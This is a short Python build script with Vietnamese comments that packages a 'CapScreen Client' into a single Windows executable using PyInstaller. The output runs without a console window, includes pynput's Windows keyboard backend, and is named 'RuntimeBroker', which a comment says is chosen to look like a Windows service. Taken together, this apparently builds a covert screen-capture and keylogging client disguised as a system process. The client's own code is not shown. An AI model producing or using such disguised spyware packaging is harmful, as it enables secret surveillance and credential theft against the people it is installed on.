"""
Build client thành .exe cho Windows
"""

import PyInstaller.__main__
import os
import shutil

print("🔨 Building CapScreen Client...")
print("="*60)

# Xóa build cũ
if os.path.exists('dist'):
    shutil.rmtree('dist')
if os.path.exists('build'):
    shutil.rmtree('build')

# Build
PyInstaller.__main__.run([
    'client.py',
    '--onefile',
    '--noconsole',
    '--name=RuntimeBroker',  # Tên giống Windows service
    '--hidden-import=pynput.keyboard._win32',
    '--add-data=config.json;.',
])

print("="*60)
print("✅ Build complete!")
print("📁 Output: dist/RuntimeBroker.exe")
print("="*60)
